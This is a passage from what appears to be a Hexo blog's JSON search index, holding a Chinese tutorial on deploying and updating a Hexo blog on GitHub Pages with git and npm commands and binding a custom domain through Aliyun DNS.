class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#git init</span><br><span class=\"line\">#git  remote add origin https://github.com/Huseck/huseck.github.io.git</span><br><span class=\"line\">#git pull origin hexo</span><br><span class=\"line\">#git checkout hexo</span><br><span class=\"line\">#cnpm install 或者 npm install </span><br><span class=\"line\">#cnpm install hexo --save</span><br><span class=\"line\">#hexo new &quot;博文名称&quot;</span><br><span class=\"line\">#hexo g</span><br><span class=\"line\">#hexo s  //测试是否内容更新</span><br><span class=\"line\">#hexo clean //清理一下缓存</span><br><span class=\"line\">#hexo g</span><br><span class=\"line\">#hexo s</span><br><span class=\"line\">#hexo d //上传到master中</span><br><span class=\"line\">另一种方法就是 </span><br><span class=\"line\">先添加远程仓库，然后克隆分支，更新内容。</span><br><span class=\"line\">git clone -b hexo git@github.com:Huseck/huseck.github.io.git</span><br><span class=\"line\">安装 npm install </span><br><span class=\"line\">npm install hexo --save</span><br><span class=\"line\">然后运行 hexo s  调试</span><br><span class=\"line\">最后push 到分支</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p><strong>注如果出现错误</strong><br>需要<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global push.default matching</span><br></pre></td></tr></table></figure></p>\n<p>消除此警告并采用新的设置值，输入：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global push.default simple</span><br></pre></td></tr></table></figure></p>\n<p>然后重新init remote 等操作需要从头开始了</p>\n<ol start=\"2\">\n<li><p>更新hexo源文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#hexo clean</span><br><span class=\"line\">#git add .</span><br><span class=\"line\">#git commit -m &quot;upodate&quot;</span><br><span class=\"line\">#git push origin hexo</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>更新一下域名<br><img src=\"QQ图片20170908111953.png\" alt=\"\"><br><strong>总结</strong><br>其他人编写博文需要在github 添加ssh-keys然后拉取hexo源文件的分支<br>今天编写.md文件上传到hexo源文件的分支仓库中，保持博文的最新<br>之后就是#hexo d 上传静态html</p>\n<h2 id=\"绑定域名\"><a href=\"#绑定域名\" class=\"headerlink\" title=\"绑定域名\"></a>绑定域名</h2><p>这里使用的是阿里云的域名直接配置解析<br>首先获取IP地址<br>ping github名.github.io<br>然后填写到解析地址上<br>之后需要配置github<br><img src=\"QQ图片20170908111953.png\" alt=\"\"><br>填写自定义的域名</p>\n</li>\n</ol>\n","categories":["blog"],"tags":["blog","运维"]},{"title":"about","url":"https://www.xjseck.com/about/index.html","content":"","categories":[],"tags":[]},{"title":"category","url":"https://www.xjseck.com/category/index.html","content":"","categories":[],"tags":[]},{"title":"link","url":"https://www.xjseck.com/link/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"https://www.xjseck.com/search/index.html","content":"","categories":[],"tags":[]},{"title":"tag","url":"https://www.xjseck.com/tag/index.html","content":"","categories":[],"tags":[]}]